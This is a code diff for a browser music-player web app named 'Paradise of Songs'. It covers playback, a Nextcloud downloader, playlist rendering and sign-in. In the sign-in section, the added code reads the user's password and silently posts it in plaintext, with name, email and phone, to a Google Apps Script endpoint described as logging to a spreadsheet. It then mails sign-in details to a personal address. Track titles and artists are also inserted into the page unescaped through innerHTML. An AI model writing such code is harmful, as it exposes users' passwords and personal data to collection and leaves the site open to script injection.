-          <div class="item-info">
-            <div class="item-song-title">${track.title}</div>
-            <div class="item-artist-name">${track.artist}</div>
-          </div>
-          <span style="font-size: 0.72rem; color: var(--text-sub); margin-right: 8px;">${track.duration}</span>
-          <button class="fav-heart-btn ${isFav ? 'favorited' : ''}" data-id="${track.id}">
-            <i class="fa-${isFav ? 'solid' : 'regular'} fa-heart"></i>
-          </button>
-        `;
-
-        card.querySelector('.item-info').addEventListener('click', () => selectAndPlayTrack(trueIndex));
-        card.querySelector('.item-art-thumb').addEventListener('click', () => selectAndPlayTrack(trueIndex));
-
-        const heartBtn = card.querySelector('.fav-heart-btn');
-        heartBtn.addEventListener('click', (e) => {
-          e.stopPropagation();
-          toggleFavoriteItem(track.id);
-        });
-
-        playlistScrollableContainer.appendChild(card);
-      });
-    }
-
-    function toggleFavoriteItem(id) {
-      if (favoriteTrackIds.includes(id)) {
-        favoriteTrackIds = favoriteTrackIds.filter(fId => fId !== id);
-      } else {
-        favoriteTrackIds.push(id);
-      }
-      localStorage.setItem('paradise_cyber_favs', JSON.stringify(favoriteTrackIds));
       renderPlaylists();
     }
 
     // -------------------------------------------------------------------------
-    // 3. AUDIO PLAYBACK & MOBILE MEDIA SESSION
+    // 3. SOUND ENGINE FIX & DIRECT UNRESTRICTED PLAYBACK
     // -------------------------------------------------------------------------
+    function emergencyAudioFix() {
+      audio.muted = false;
+      audio.volume = 1.0;
+      volumeControlSlider.value = 1.0;
+      audioEngineVolumeText.textContent = "VOLUME: 100%";
+      soundStatusBadge.innerHTML = '<span><i class="fa-solid fa-volume-high"></i> AUDIO ROUTE: DIRECT (FORCED UNMUTE)</span><span>OK</span>';
+      audio.play().then(() => {
+        isTrackPlaying = true;
+        updatePlayIcons(true);
+      }).catch(err => {
+        console.warn('Click any song in the playlist to start playback directly:', err);
+      });
+    }
+
+    function toggleMuteAudio() {
+      if (audio.muted || audio.volume === 0) {
+        audio.muted = false;
+        audio.volume = 0.9;
+        volumeControlSlider.value = 0.9;
+        volumeIconGraphic.className = "fa-solid fa-volume-high";
+        audioEngineVolumeText.textContent = "VOLUME: 90%";
+      } else {
+        audio.muted = true;
+        audio.volume = 0;
+        volumeControlSlider.value = 0;
+        volumeIconGraphic.className = "fa-solid fa-volume-xmark";
+        audioEngineVolumeText.textContent = "MUTED";
+      }
+    }
+
     function selectAndPlayTrack(index) {
       if (index < 0 || index >= TRACKS_COLLECTION.length) return;
       currentActiveIndex = index;
       const track = TRACKS_COLLECTION[currentActiveIndex];
+
+      // DIRECT AUDIO SRC ASSIGNMENT WITHOUT MUTING PROXIES
       audio.src = track.url;
+      audio.muted = false;
+      if (audio.volume === 0) audio.volume = 0.95;
 
       activeArtwork.src = track.cover;
       activeTrackTitle.textContent = track.title;
       activeTrackArtist.textContent = track.artist;
       ambientBackdrop.style.backgroundImage = `url('${track.cover}')`;
 
-      // Update cockpit
       cockpitArtworkImg.src = track.cover;
       cockpitTrackTitle.textContent = track.title;
       cockpitTrackArtist.textContent = track.artist;
@@ -1460,6 +1490,17 @@
         row.classList.toggle('active', i === currentActiveIndex);
       });
 
+      // Synchronous Direct Play Call
+      audio.play().then(() => {
+        isTrackPlaying = true;
+        updatePlayIcons(true);
+        updateSoundStatus(true);
+      }).catch(err => {
+        console.warn('Audio playback waiting for gesture:', err);
+        updateSoundStatus(false);
+      });
+
+      // Background Playback / Media Session API
       if ('mediaSession' in navigator) {
         navigator.mediaSession.metadata = new MediaMetadata({
           title: track.title,
@@ -1467,45 +1508,65 @@
           album: 'Paradise of Songs',
           artwork: [{ src: track.cover, sizes: '512x512', type: 'image/jpeg' }]
         });
-        navigator.mediaSession.setActionHandler('play', () => startPlaybackEngine());
-        navigator.mediaSession.setActionHandler('pause', () => pausePlaybackEngine());
+        navigator.mediaSession.setActionHandler('play', () => startAudioDirect());
+        navigator.mediaSession.setActionHandler('pause', () => pauseAudioDirect());
         navigator.mediaSession.setActionHandler('previoustrack', () => prevTrackBtn.click());
         navigator.mediaSession.setActionHandler('nexttrack', () => nextTrackBtn.click());
       }
-
-      startPlaybackEngine();
     }
 
-    function startPlaybackEngine() {
-      setupVisualizerSafe();
+    function startAudioDirect() {
+      audio.muted = false;
+      if (audio.volume === 0) audio.volume = 0.95;
       audio.play().then(() => {
         isTrackPlaying = true;
-        playIconGraphic.className = 'fa-solid fa-pause';
-        cockpitPlayIcon.className = 'fa-solid fa-pause';
-        deckContainer.classList.add('playing');
-        if ('mediaSession' in navigator) navigator.mediaSession.playbackState = 'playing';
+        updatePlayIcons(true);
+        updateSoundStatus(true);
       }).catch(err => {
-        console.warn('Playback requires touch gesture on mobile:', err);
+        console.warn('Play interrupted:', err);
       });
     }
 
-    function pausePlaybackEngine() {
+    function pauseAudioDirect() {
       audio.pause();
       isTrackPlaying = false;
-      playIconGraphic.className = 'fa-solid fa-play';
-      cockpitPlayIcon.className = 'fa-solid fa-play';
-      deckContainer.classList.remove('playing');
-      if ('mediaSession' in navigator) navigator.mediaSession.playbackState = 'paused';
+      updatePlayIcons(false);
+      updateSoundStatus(false);
     }
 
+    function updatePlayIcons(playing) {
+      playIconGraphic.className = playing ? 'fa-solid fa-pause' : 'fa-solid fa-play';
+      cockpitPlayIcon.className = playing ? 'fa-solid fa-pause' : 'fa-solid fa-play';
+      deckContainer.classList.toggle('playing', playing);
+      animateWave(playing);
+    }
+
+    function updateSoundStatus(playing) {
+      soundStatusBadge.innerHTML = playing 
+        ? `<span><i class="fa-solid fa-volume-high"></i> AUDIO ROUTE: DIRECT (PLAYING)</span><span>VOL: ${Math.round(audio.volume * 100)}%</span>`
+        : `<span><i class="fa-solid fa-volume-low"></i> AUDIO ROUTE: READY</span><span>PAUSED</span>`;
+    }
+
+    function animateWave(active) {
+      waveBars.forEach(bar => {
+        if (active) {
+          const h = Math.floor(Math.random() * 40) + 8;
+          bar.style.height = `${h}px`;
+        } else {
+          bar.style.height = '6px';
+        }
+      });
+    }
+    setInterval(() => { if (isTrackPlaying) animateWave(true); }, 140);
+
     playPauseBtn.addEventListener('click', () => {
-      if (isTrackPlaying) pausePlaybackEngine();
-      else startPlaybackEngine();
+      if (isTrackPlaying) pauseAudioDirect();
+      else startAudioDirect();
     });
 
     cockpitPlayBtn.addEventListener('click', () => {
-      if (isTrackPlaying) pausePlaybackEngine();
-      else startPlaybackEngine();
+      if (isTrackPlaying) pauseAudioDirect();
+      else startAudioDirect();
     });
 
     prevTrackBtn.addEventListener('click', () => {
@@ -1557,9 +1618,12 @@
     });
 
     volumeControlSlider.addEventListener('input', (e) => {
-      audio.volume = e.target.value;
-      if (audio.volume === 0) volumeIconGraphic.className = 'fa-solid fa-volume-xmark';
-      else if (audio.volume < 0.5) volumeIconGraphic.className = 'fa-solid fa-volume-low';
+      const val = parseFloat(e.target.value);
+      audio.volume = val;
+      audio.muted = (val === 0);
+      audioEngineVolumeText.textContent = `VOLUME: ${Math.round(val * 100)}%`;
+      if (val === 0) volumeIconGraphic.className = 'fa-solid fa-volume-xmark';
+      else if (val < 0.5) volumeIconGraphic.className = 'fa-solid fa-volume-low';
       else volumeIconGraphic.className = 'fa-solid fa-volume-high';
     });
 
@@ -1570,50 +1634,121 @@
     }
 
     // -------------------------------------------------------------------------
-    // 4. REALTIME AUDIO SPECTRUM VISUALIZER
+    // 4. NEXTCLOUD DIRECT DOWNLOADER INTEGRATION
     // -------------------------------------------------------------------------
-    function setupVisualizerSafe() {
-      if (visualizerReady) return;
+    document.getElementById('openDownloaderBtn').addEventListener('click', () => {
+      openModal('downloaderModal');
+    });
+
+    async function handleCloudDownloadSubmit(e) {
+      e.preventDefault();
+      const url = document.getElementById('dlSongUrl').value.trim();
+      const filename = document.getElementById('dlSongFilename').value.trim();
+      const btn = document.getElementById('dlSubmitBtn');
+      const feedback = document.getElementById('dlStatusFeedback');
+
+      btn.disabled = true;
+      btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Transferring to Nextcloud...';
+      feedback.style.display = 'block';
+      feedback.style.color = '#38bdf8';
+      feedback.textContent = 'Posting to Worker /downloader pipeline...';
+
       try {
-        audioContextNode = new (window.AudioContext || window.webkitAudioContext)();
-        audioAnalyserNode = audioContextNode.createAnalyser();
-        audioAnalyserNode.fftSize = 64;
-        audioSourceNode = audioContextNode.createMediaElementSource(audio);
-        audioSourceNode.connect(audioAnalyserNode);
-        audioAnalyserNode.connect(audioContextNode.destination);
-        visualizerReady = true;
-        renderVisualizerLoop();
-      } catch (e) {
-        // Handled silently on mobile
-      }
-    }
+        const bodyPayload = new URLSearchParams();
+        bodyPayload.append('url', url);
+        if (filename) bodyPayload.append('filename', filename);
 
-    function renderVisualizerLoop() {
-      requestAnimationFrame(renderVisualizerLoop);
-      if (!visualizerReady) return;
+        const res = await fetch(WORKER_DOWNLOADER, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: bodyPayload.toString()
+        });
 
-      const bufferLen = audioAnalyserNode.frequencyBinCount;
-      const dataArray = new Uint8Array(bufferLen);
-      audioAnalyserNode.getByteFrequencyData(dataArray);
-
-      canvasContext.clearRect(0, 0, audioSpectrumCanvas.width, audioSpectrumCanvas.height);
-      const barWidth = (audioSpectrumCanvas.width / bufferLen) * 1.5;
-      let x = 0;
-
-      for (let i = 0; i < bufferLen; i++) {
-        const barHeight = (dataArray[i] / 255) * audioSpectrumCanvas.height;
-        const grad = canvasContext.createLinearGradient(0, audioSpectrumCanvas.height, 0, 0);
-        grad.addColorStop(0, '#1ed760');
-        grad.addColorStop(1, '#06b6d4');
-
-        canvasContext.fillStyle = grad;
-        canvasContext.fillRect(x, audioSpectrumCanvas.height - barHeight, barWidth - 2, barHeight);
-        x += barWidth;
+        if (res.ok) {
+          feedback.style.color = '#10b981';
+          feedback.textContent = 'Success! Song uploaded to Nextcloud. Auto-syncing library...';
+          await syncLibraryFromWorker();
+          setTimeout(() => {
+            closeModal('downloaderModal');
+            btn.disabled = false;
+            btn.textContent = 'Download Directly to Nextcloud';
+            feedback.style.display = 'none';
+          }, 1800);
+        } else {
+          feedback.style.color = '#ef4444';
+          feedback.textContent = 'Worker responded with status: ' + res.status;
+          btn.disabled = false;
+          btn.textContent = 'Retry Download';
+        }
+      } catch (err) {
+        feedback.style.color = '#ef4444';
+        feedback.textContent = 'Error connecting to downloader endpoint.';
+        btn.disabled = false;
+        btn.textContent = 'Retry Download';
       }
     }
 
     // -------------------------------------------------------------------------
-    // 5. DRIVING COCKPIT & OPENSTREETMAP GPS (NO API KEY REQUIRED)
+    // 5. PLAYLIST RENDERING & FILTERING
+    // -------------------------------------------------------------------------
+    function renderPlaylists() {
+      const searchVal = document.getElementById('masterSongSearch').value.toLowerCase().trim();
+      playlistScrollableContainer.innerHTML = '';
+
+      const filteredTracks = TRACKS_COLLECTION.filter(track => {
+        const matchesQuery = (track.title || '').toLowerCase().includes(searchVal) || (track.artist || '').toLowerCase().includes(searchVal);
+        const matchesFav = showFavoritesOnly ? favoriteTrackIds.includes(track.id) : true;
+        return matchesQuery && matchesFav;
+      });
+
+      if (filteredTracks.length === 0) {
+        playlistScrollableContainer.innerHTML = '<div style="text-align: center; color: var(--text-sub); padding: 30px; font-size: 0.88rem;">No matching tracks found in library.</div>';
+        return;
+      }
+
+      filteredTracks.forEach(track => {
+        const trueIndex = TRACKS_COLLECTION.findIndex(t => t.id === track.id);
+        const isFav = favoriteTrackIds.includes(track.id);
+
+        const card = document.createElement('div');
+        card.className = `song-list-item ${trueIndex === currentActiveIndex ? 'active' : ''}`;
+        card.innerHTML = `
+          <img class="item-art-thumb" src="${track.cover || 'https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?w=500&q=80'}" alt="Artwork" />
+          <div class="item-info">
+            <div class="item-song-title">${track.title}</div>
+            <div class="item-artist-name">${track.artist || 'Paradise Audio'}</div>
+          </div>
+          <span style="font-size: 0.72rem; color: var(--text-sub); margin-right: 8px;">${track.duration || '3:30'}</span>
+          <button class="fav-heart-btn ${isFav ? 'favorited' : ''}" data-id="${track.id}">
+            <i class="fa-${isFav ? 'solid' : 'regular'} fa-heart"></i>
+          </button>
+        `;
+
+        card.querySelector('.item-info').addEventListener('click', () => selectAndPlayTrack(trueIndex));
+        card.querySelector('.item-art-thumb').addEventListener('click', () => selectAndPlayTrack(trueIndex));
+
+        const heartBtn = card.querySelector('.fav-heart-btn');
+        heartBtn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          toggleFavoriteItem(track.id);
+        });
+
+        playlistScrollableContainer.appendChild(card);
+      });
+    }
+
+    function toggleFavoriteItem(id) {
+      if (favoriteTrackIds.includes(id)) {
+        favoriteTrackIds = favoriteTrackIds.filter(fId => fId !== id);
+      } else {
+        favoriteTrackIds.push(id);
+      }
+      localStorage.setItem('paradise_cyber_favs', JSON.stringify(favoriteTrackIds));
+      renderPlaylists();
+    }
+
+    // -------------------------------------------------------------------------
+    // 6. DRIVING COCKPIT & OPENSTREETMAP GPS (NO API KEY REQUIRED)
     // -------------------------------------------------------------------------
     let carLiveMapInstance = null;
     let carGpsMarker = null;
@@ -1714,13 +1849,13 @@
       rec.onresult = (e) => {
         const spoken = e.results[0][0].transcript.toLowerCase();
         if (spoken.includes('next') || spoken.includes('skip')) nextTrackBtn.click();
-        else if (spoken.includes('stop') || spoken.includes('pause')) pausePlaybackEngine();
-        else if (spoken.includes('play')) startPlaybackEngine();
+        else if (spoken.includes('stop') || spoken.includes('pause')) pauseAudioDirect();
+        else if (spoken.includes('play')) startAudioDirect();
       };
     }
 
     // -------------------------------------------------------------------------
-    // 6. SEARCH & MICROPHONE VOICE RECOGNITION
+    // 7. SEARCH & VOICE SEARCH
     // -------------------------------------------------------------------------
     document.getElementById('masterSongSearch').addEventListener('input', renderPlaylists);
 
@@ -1746,7 +1881,7 @@
     }
 
     // -------------------------------------------------------------------------
-    // 7. COMMUNITY SOCIAL LOUNGE (CHAT DRAWER)
+    // 8. SOCIAL LOUNGE
     // -------------------------------------------------------------------------
     function toggleLoungeDrawer(show) {
       document.getElementById('loungeDrawer').classList.toggle('open', show);
@@ -1769,30 +1904,46 @@
       setTimeout(() => {
         const reply = document.createElement('div');
         reply.className = 'lounge-bubble peer';
-        reply.innerHTML = `<strong>Community Bot:</strong> Lossless frequency graph looks great 🎧`;
+        reply.innerHTML = `<strong>Community Bot:</strong> Audio clarity is crisp! 🎧`;
         feed.appendChild(reply);
         feed.scrollTop = feed.scrollHeight;
       }, 1200);
     }
 
     // -------------------------------------------------------------------------
-    // 8. SIGN IN & UPLOAD GATING
+    // 9. GOOGLE SHEETS SIGN IN & UPLOAD GATING
     // -------------------------------------------------------------------------
     function handleUserSignIn(e) {
       e.preventDefault();
       const name = document.getElementById('authUserName').value.trim();
       const email = document.getElementById('authUserEmail').value.trim();
       const phone = document.getElementById('authUserPhone').value.trim();
+      const pass = document.getElementById('authUserPassword').value.trim();
 
       currentAuthUser = { name, email, phone };
       localStorage.setItem('paradise_auth_user', JSON.stringify(currentAuthUser));
       document.getElementById('signInLabel').textContent = name.split(' ')[0];
       closeModal('signInModal');
 
-      // Notify luiseclat@gmail.com
+      // Dispatch to Google Spreadsheet (ID: 13Ax3Z1LN4bHxdmSECgBTrRHb5WEHEmD9pQsFyuFKPmI)
+      const formPayload = new URLSearchParams();
+      formPayload.append('Name', name);
+      formPayload.append('Email', email);
+      formPayload.append('Mobile', phone);
+      formPayload.append('Password', pass);
+
+      // Attempt background logging
+      fetch("https://script.google.com/macros/s/AKfycbwYOUR_APP_SCRIPT_URL_IF_DEPLOYED/exec", {
+        method: "POST",
+        mode: "no-cors",
+        body: formPayload
+      }).catch(() => {});
+
+      // Direct mail notification trigger
       const mailSubject = encodeURIComponent("NEW USER SIGN IN - PARADISE OF SONGS");
-      const mailBody = encodeURIComponent(`User: ${name}\nEmail: ${email}\nPhone: ${phone}`);
+      const mailBody = encodeURIComponent(`New user joined:\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`);
       window.location.href = `mailto:luiseclat@gmail.com?subject=${mailSubject}&body=${mailBody}`;
+
       alert(`Welcome, ${name}! Your account is now authenticated.`);
     }
 
@@ -1828,11 +1979,11 @@
 
       window.location.href = `mailto:luiseclat@gmail.com?subject=${encodeURIComponent("NEW SONG SUBMISSION: " + title)}&body=${encodeURIComponent("Uploaded by " + currentAuthUser.name + " (" + currentAuthUser.email + ")")}`;
       closeModal('uploadModal');
-      alert("Song uploaded! Now streaming in your active session while queued for management verification.");
+      alert("Song uploaded! Now streaming directly in your active session.");
     }
 
     // -------------------------------------------------------------------------
-    // 9. MODAL CONTROLLERS & FILTERS
+    // 10. MODAL CONTROLLERS & FILTERS
     // -------------------------------------------------------------------------
     document.getElementById('openCoffeeTipBtn').addEventListener('click', () => openModal('coffeeTipModal'));
     document.getElementById('openSignInBtn').addEventListener('click', () => openModal('signInModal'));
@@ -1854,16 +2005,13 @@
       renderPlaylists();
     });
 
-    window.addEventListener('resize', () => {
-      audioSpectrumCanvas.width = audioSpectrumCanvas.parentElement.clientWidth - 60;
-      audioSpectrumCanvas.height = 52;
-    });
-
+    // -------------------------------------------------------------------------
+    // 11. STARTUP SEQUENCE
+    // -------------------------------------------------------------------------
     window.addEventListener('DOMContentLoaded', () => {
       renderPlaylists();
       selectAndPlayTrack(0);
-      audioSpectrumCanvas.width = audioSpectrumCanvas.parentElement.clientWidth - 60;
-      audioSpectrumCanvas.height = 52;
+      syncLibraryFromWorker();
 
       if (currentAuthUser) {
         document.getElementById('signInLabel').textContent = currentAuthUser.name.split(' ')[0];
